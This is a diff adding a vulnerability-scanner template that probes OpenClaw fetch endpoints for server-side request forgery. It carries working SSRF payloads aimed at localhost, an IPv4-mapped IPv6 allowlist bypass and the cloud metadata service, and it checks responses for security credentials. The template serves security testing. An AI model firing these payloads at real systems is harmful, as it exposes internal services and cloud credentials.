@@ -1,0 +1,135 @@
+http:
+- matchers:
+  - condition: or
+    part: body
+    type: word
+    words:
+    - ok
+    - healthy
+    - status
+  - status:
+    - 200
+    type: status
+  matchers-condition: or
+  raw:
+  - 'POST /__openclaw/api/fetch HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/json
+
+
+    {"url":"http://127.0.0.1:18789/healthz"}
+
+    '
+  - 'POST /__openclaw__/api/fetch HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/json
+
+
+    {"url":"http://127.0.0.1:18789/healthz"}
+
+    '
+- matchers:
+  - condition: or
+    part: body
+    type: word
+    words:
+    - ok
+    - healthy
+    - status
+  - status:
+    - 200
+    type: status
+  matchers-condition: or
+  raw:
+  - 'POST /__openclaw/api/fetch HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/json
+
+
+    {"url":"http://[::ffff:127.0.0.1]:18789/healthz"}
+
+    '
+  - 'POST /__openclaw__/api/fetch HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/json
+
+
+    {"url":"http://[::ffff:127.0.0.1]:18789/healthz"}
+
+    '
+- matchers:
+  - condition: or
+    part: body
+    type: word
+    words:
+    - ami-id
+    - instance-id
+    - security-credentials
+    - meta-data
+  matchers-condition: or
+  raw:
+  - 'POST /__openclaw/api/fetch HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/json
+
+
+    {"url":"http://169.254.169.254/latest/meta-data/"}
+
+    '
+  - 'POST /__openclaw__/api/fetch HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/json
+
+
+    {"url":"http://169.254.169.254/latest/meta-data/"}
+
+    '
+id: openclaw-ssrf-proxy-bypass
+info:
+  author: LobsterGuard
+  description: 'Tests whether the OpenClaw fetch/proxy endpoints can be abused to
+
+    reach internal services. Checks both the /__openclaw/ and
+
+    /__openclaw__/ fetch API paths with internal target URLs including
+
+    IPv4-mapped IPv6 addresses (::ffff:127.0.0.1) that may bypass DNS
+
+    pinning and IP allowlist checks. Also probes configuration for
+
+    TRUSTED_ENV_PROXY settings that weaken SSRF protections.
+
+    '
+  metadata:
+    chain_id: 45
+  name: OpenClaw SSRF via Proxy Mode DNS Pinning Bypass
+  reference:
+  - https://github.com/lobster-guard/openclaw-security
+  severity: high
+  tags: openclaw,ssrf,proxy,ipv6,bypass
+websocket:
+- address: '{{scheme}}://{{Hostname}}/ws'
+  inputs:
+  - data: '{"jsonrpc":"2.0","id":1,"method":"config.get","params":{"path":"server.proxy"}}
+
+      '
+  matchers:
+  - condition: or
+    part: body
+    type: word
+    words:
+    - TRUSTED_ENV_PROXY
+    - proxyUrl
+    - noProxy
